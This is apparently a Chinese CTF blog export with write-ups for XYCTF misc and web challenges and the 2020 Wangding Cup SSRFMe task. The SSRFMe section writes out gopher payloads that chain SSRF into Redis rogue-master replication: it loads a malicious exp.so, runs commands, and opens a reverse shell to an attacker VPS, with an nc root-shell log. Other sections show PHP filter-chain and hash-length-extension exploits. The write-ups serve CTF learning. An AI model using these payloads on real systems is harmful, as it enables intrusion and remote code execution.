<h2 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h2><p>看一下源码<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGBFD.png" alt="OpGBFD.png" loading="lazy"><br>把执行输出flag的指令再控制台执行一遍就行了<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGTRF.png" alt="OpGTRF.png" loading="lazy"></p>
<h2 id="ez隐写"><a href="#ez隐写" class="headerlink" title="ez隐写"></a>ez隐写</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpGU96.png" alt="OpGU96.png" loading="lazy"><br>两处伪加密修改成00<br>hint.png修复长宽<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGbUP.png" alt="OpGbUP.png" loading="lazy"><br>试了几下发现解压密码是20240401<br>拿到一张水印图片<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGkyb.png" alt="OpGkyb.png" loading="lazy"><br>然后提取一下隐形水印<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGxdl.png" alt="OpGxdl.png" loading="lazy"></p>
<h2 id="ZIP神之套"><a href="#ZIP神之套" class="headerlink" title="ZIP神之套"></a>ZIP神之套</h2><p>用ida打开exe文件看到有字符串xyctf????????ftcyx<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGFag.png" alt="OpGFag.png" loading="lazy"><br>猜测压缩包的掩码攻击<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGheB.png" alt="OpGheB.png" loading="lazy"><br>爆破出来密码是xyctf20240402ftcyx<br>打开之后有两个文件 一个加密一个不加密，文件内容极其相似<br>明文攻击<br>恢复密钥然后还原就能打开了<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGiEs.png" alt="OpGiEs.png" loading="lazy"></p>
<h2 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h2><p>用UCB RISC-V架构执行TCPL文件<br>环境搭建参考<br><a href="https://blog.csdn.net/qq_63922192/article/details/133495747">https://blog.csdn.net/qq_63922192/article/details/133495747</a><br><img src="https://ooo.0x0.ooo/2024/04/28/OpGnIK.png" alt="OpGnIK.png" loading="lazy"><br>flag里面的1换成0就ok了</p>
<h2 id="网络追踪"><a href="#网络追踪" class="headerlink" title="网络追踪"></a>网络追踪</h2><p>根据最后几个包知道靶机ip是192.168.204.133<br><img src="https://ooo.0x0.ooo/2024/04/28/OpG7ha.png" alt="OpG7ha.png" loading="lazy"><br>通过三次握手过滤出开放的端口<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGNRS.png" alt="OpGNRS.png" loading="lazy"><br>发现开放445 139 135三个端口<br>根据SMB 445 windows xp 搜索相关cve<br>试了好多才试出来<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGejN.png" alt="OpGejN.png" loading="lazy"></p>
<h2 id="Osint2"><a href="#Osint2" class="headerlink" title="Osint2"></a>Osint2</h2><p>根据洛阳龙门站点和实践15:10搜索到相关车次<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGAUC.png" alt="OpGAUC.png" loading="lazy"><br>然后搜了一下发现G3292搜不到，车次就是G3293<br>再搜洛阳必去景点试了几个<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGKyL.png" alt="OpGKyL.png" loading="lazy"><br>第二个老君山就是的</p>
<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpGZsi.png" alt="OpGZsi.png" loading="lazy"><br>两串数字对应开头和结尾flag<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGyaX.png" alt="OpGyaX.png" loading="lazy"><br>第一段XYCTF<code>&#123;this_a_</code><br><img src="https://ooo.0x0.ooo/2024/04/28/OpGget.png" alt="OpGget.png" loading="lazy"><br>第三段<code>find_it&#125;</code><br>中间那段找了很长时间，跟最开始的想法一样隐写再图片里了<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGmGx.png" alt="OpGmGx.png" loading="lazy"><br>这个图片先转webp转png然后lsb隐写<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGpIj.png" alt="OpGpIj.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/28/OpGPhp.png" alt="OpGPhp.png" loading="lazy"><br>好奇怪的编码不过keyborad也算小小提示<br>第二段bl0ckbuster_for_png_and_i_think_yon_can_<br>XYCTF{this_a_bl0ckbuster_for_png_and_i_think_yon_can_find_it}</p>
<h2 id="Osint1"><a href="#Osint1" class="headerlink" title="Osint1"></a>Osint1</h2><p>小红书有人发了，在南通海安最东面沿海<br>高德地图跟一下发现最东边有条路滨海东路正好跟图片里面的一样<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGHgq.png" alt="OpGHgq.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/28/OpGLsc.png" alt="OpGLsc.png" loading="lazy"></p>
<h2 id="真-签到"><a href="#真-签到" class="headerlink" title="真&gt;签到"></a>真&gt;签到</h2><p>放到010就出了<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGGor.png" alt="OpGGor.png" loading="lazy"></p>
<h2 id="Ez-Base1024-2"><a href="#Ez-Base1024-2" class="headerlink" title="Ez_Base1024*2"></a>Ez_Base1024*2</h2><p><img src="https://ooo.0x0.ooo/2024/04/28/OpGQrM.png" alt="OpGQrM.png" loading="lazy"></p>
<h2 id="Ez-osint"><a href="#Ez-osint" class="headerlink" title="Ez_osint"></a>Ez_osint</h2><p>用stegsolve可以看到水印<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGSGG.png" alt="OpGSGG.png" loading="lazy"><br>根据时间搜索相关时光邮件<br>好在ulr可以跳转页数<br>最后定位然后在评论区找到flag<br><img src="https://ooo.0x0.ooo/2024/04/28/OpG031.png" alt="OpG031.png" loading="lazy"></p>
<h2 id="美妙的歌声"><a href="#美妙的歌声" class="headerlink" title="美妙的歌声"></a>美妙的歌声</h2><p>audition打开拿到密码<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGdhI.png" alt="OpGdhI.png" loading="lazy"><br>然后用deepsound解密<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGstD.png" alt="OpGstD.png" loading="lazy"><br>提取出flag<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGV2F.png" alt="OpGV2F.png" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB,MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF未解题复现</title>
    <url>/posts/7345579c/</url>
    <content><![CDATA[<p>web方向有5个题目没出，复现一下<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGfW6.png" alt="OpGfW6.png" loading="lazy"></p>
<h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>下载源码发现有&#x2F;what’s_this.php目录<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGlgP.png" alt="OpGlgP.png" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$p</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|=|php|file|:|\/|\?/i"</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"waf!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$payload</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/<span class="token interpolation"><span class="token variable">$p</span></span>/resource=/etc/passwd"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"XYCTF"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>
<p>考察的主要是filer链,那个工具我还用过，比赛的时候没想起来0.0，主要考察的就是构造出想要的字符串然后去掉乱码<br><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a><br><img src="https://ooo.0x0.ooo/2024/04/28/OpG2ol.png" alt="OpG2ol.png" loading="lazy"><br>测试一下<br><img src="https://ooo.0x0.ooo/2024/04/28/OpGC2S.png" alt="OpGC2S.png" loading="lazy"><br>结果确实出现了XYCTF，但是还有一堆乱码，用string.strip_tags过滤器去掉垃圾字符<br>string.strip_tags能去掉标签<code>&lt;</code>后面的字符，所以重新构造一下<br><img src="https://ooo.0x0.ooo/2024/04/28/OpQMbN.png" alt="OpQMbN.png" loading="lazy"><br>在过滤器后面加上<code>string.strip_tags</code>发现结果就是剩下<code>XYCTF</code>了<br><img src="https://ooo.0x0.ooo/2024/04/28/OpQ5rX.png" alt="OpQ5rX.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/28/OpQBQt.png" alt="OpQBQt.png" loading="lazy"><br>拿下</p>
<h2 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h2><p><img src="https://ooo.0x0.ooo/2024/05/07/OpwhrX.png" alt="OpwhrX.png" loading="lazy"><br>其实看到题就知道是md5长度拓展攻击，但是苦于不知道flag长度所以没做，看wp才知道平台flag长度固定43 0.0<br>属实大意了，现在来重做一下<br>用一个之前用过的工具<strong>hash_ext_attack</strong>,项目地址<br><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a><br>先生成拓展字符，time的时间戳直接用unix在线时间戳，提前一点，方便操作<br><img src="https://ooo.0x0.ooo/2024/05/07/OpwnCx.png" alt="OpwnCx.png" loading="lazy"></p>
<p>然后写个py脚本不断发包就行了，或者用bp 一直intruder</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url<span class="token operator">=</span><span class="token string">'http://gz.imxbt.cn:20394/?md5=3b1f9b9c57bafcda64a0f29b0fb409ad&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00'</span>

  

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>

    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">"XYCTF"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

        <span class="token keyword">break</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/07/Opw7ij.png" alt="Opw7ij.png" loading="lazy"></p>
<h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><p>这个也是makefile系列的最后一题，确实没做出来，正好学习一下。<br>在makefile中存在一些自动变量<br><img src="https://ooo.0x0.ooo/2024/05/07/OpwN4p.png" alt="OpwN4p.png" loading="lazy"><br>想看所有依赖发现被ban<br><img src="https://ooo.0x0.ooo/2024/05/07/Opwe6U.png" alt="Opwe6U.png" loading="lazy"><br>不过可以看第一个依赖<br><img src="https://ooo.0x0.ooo/2024/05/07/OpwAbY.png" alt="OpwAbY.png" loading="lazy"><br>第一个依赖就是&#x2F;flag<br>想重定向读出来发现不行<br><img src="https://ooo.0x0.ooo/2024/05/07/OpwKmv.png" alt="OpwKmv.png" loading="lazy"><br>读到变量也不行<br><img src="https://ooo.0x0.ooo/2024/05/07/OpwZYq.png" alt="OpwZYq.png" loading="lazy"><br>用$打开变量,成功拿到flag<br><img src="https://ooo.0x0.ooo/2024/05/07/Opwyqc.png" alt="Opwyqc.png" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB,MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020玄武组SSRFMe</title>
    <url>/posts/2f532906/</url>
    <content><![CDATA[<h1 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h1><p>如果把数据存储在单个Redis的实例中，当读写数据量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写C语言并编译出.so文件。<br>Redis服务默认端口是<strong>6379</strong>。</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://ooo.0x0.ooo/2024/05/17/OJZWVS.png" alt="OJZWVS.png" loading="lazy"></p>
<pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">' is inner ip'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Please visit hint.php locally.</span>
<span class="token delimiter important">?></span></span></code></pre>
<p>对传入的参数url有如下限制:</p>
<ol>
<li>只能使用http|https|gopher|dict四种协议</li>
<li>将通过parse_url获取的地址执行gethostbyname()函数，搜了一下这个函数解析不了127.0.0.1，也防御了xip.io这类利用dns解析的绕过方法</li>
<li>使用ip2long将ip地址转为整数，判断是否为内网网段<br>绕过方法<br><code>url=http://0.0.0.0/hint.php</code><br><img src="https://ooo.0x0.ooo/2024/05/17/OJZkqN.png" alt="OJZkqN.png" loading="lazy"><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php echo 'redispass is root';exit();"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>
告诉了redis的密码是root，说明考的就是redis主从复制了<br>用到两个工具<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server
# redis-rogue-server，未授权使用

https:&#x2F;&#x2F;github.com&#x2F;Testzero-wz&#x2F;Awsome-Redis-Rogue-Server
# Awsome-Redis-Rogue-Server，有授权使用</code></pre>
这里将<strong>redis-rogue-server</strong>下的exp.so复制到<strong>Awsome-Redis-Rogue-Server</strong>下，然后用<strong>Awsome-Redis-Rogue-Server</strong>开个主服务，利用redis主从复制把exp.so传到靶机上。<pre class="language-bash" data-language="bash"><code class="language-bash">tao@VM-24-9-ubuntu:~/redisvuln/Awsome-Redis-Rogue-Server-master/Awsome-Redis-Rogue-Server-master$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">140</span>
drwxr-xr-x <span class="token number">3</span> root root  <span class="token number">4096</span> May <span class="token number">17</span> <span class="token number">13</span>:31 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root  <span class="token number">4096</span> May <span class="token number">17</span> <span class="token number">13</span>:19 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">44320</span> May <span class="token number">17</span> <span class="token number">13</span>:31 exp.so
-rw-r--r-- <span class="token number">1</span> root root    <span class="token number">66</span> May <span class="token number">17</span> <span class="token number">13</span>:19 .gitattributes
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">1065</span> May <span class="token number">17</span> <span class="token number">13</span>:19 LICENSE
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">48144</span> May <span class="token number">17</span> <span class="token number">13</span>:19 module.so
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">5954</span> May <span class="token number">17</span> <span class="token number">13</span>:19 README.md
drwxr-xr-x <span class="token number">4</span> root root  <span class="token number">4096</span> May <span class="token number">17</span> <span class="token number">13</span>:19 RedisModules
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">19227</span> May <span class="token number">17</span> <span class="token number">13</span>:19 redis_rogue_server.py</code></pre>
<blockquote>
<p>python3 redis_rogue_server.py -v -path exp.so<br> -v      #冗余模式，仅启动Rouge Server模式，默认开启15000端口<br> -lport可指定端口<br> -path   #指定.so文件</p>
</blockquote>
</li>
</ol>
<pre class="language-bash" data-language="bash"><code class="language-bash">tao@VM-24-9-ubuntu:~/redisvuln/Awsome-Redis-Rogue-Server-master/Awsome-Redis-Rogue-Server-master$ python3 redis_rogue_server.py <span class="token parameter variable">-v</span> <span class="token parameter variable">-path</span> exp.so <span class="token parameter variable">-lport</span> <span class="token number">4567</span></code></pre>
<p>我把主服务开到了一个我vps开放的一个4567端口</p>
<p>然后配合gopher协议在靶机上设置备份路径</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dir%2520&#x2F;tmp&#x2F;%250d%250aquit

&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;config set dir &#x2F;tmp&#x2F;
&#x2F;&#x2F;quit</code></pre>
<p>用二次url编码传参<br><img src="https://ooo.0x0.ooo/2024/05/17/OJZyCc.png" alt="OJZyCc.png" loading="lazy"></p>
<p>然后重新登录生成一个exp.so的文件，然后再主从同步</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520VPS%25204567%250d%250aquit

&#x2F;&#x2F;把中间的VPS换成自己的VPS ip
&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;config set dbfilename exp.so
&#x2F;&#x2F;slaveof VPS 4567
&#x2F;&#x2F;quit</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/17/OJZmnr.png" alt="OJZmnr.png" loading="lazy"></p>
<p>然后加载这个exp模块</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250amodule%2520load%2520.&#x2F;exp.so%250d%250aquit

&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;module load .&#x2F;exp.so
&#x2F;&#x2F;quit</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/17/OJZpDM.png" alt="OJZpDM.png" loading="lazy"></p>
<p>然后关闭主从同步</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit

&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;slaveof NO ONE
&#x2F;&#x2F;quit</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/17/OJZJ6G.png" alt="OJZJ6G.png" loading="lazy"></p>
<p>最后执行system.exec就能rce</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit

&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;system.exec &quot;cat &#x2F;flag&quot;
&#x2F;&#x2F;quit</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/17/OJZRk1.png" alt="OJZRk1.png" loading="lazy"><br>拿到flag了，也可以选择反弹个shell到vps</p>
<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250asystem.rev%2520VPS%25208000%250d%250aquit

&#x2F;&#x2F;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
&#x2F;&#x2F;system.rev VPS 8000
&#x2F;&#x2F;quit</code></pre>


<pre><code class="bash">
root@VM-24-9-ubuntu:~# nc -lvnp 8000
Listening on 0.0.0.0 8000
Connection received on 117.21.200.176 15130
id
uid=0(root) gid=0(root) groups=0(root)
cat /f*
flag&#123;ba576d3d-78f1-417a-a2b8-a6189cc22208&#125;
#!/bin/sh

echo $FLAG&gt; /flag
export FLAG=flag_not_here
FLAG=flag_not_here

</code></pre>
]]></content>
      <categories>
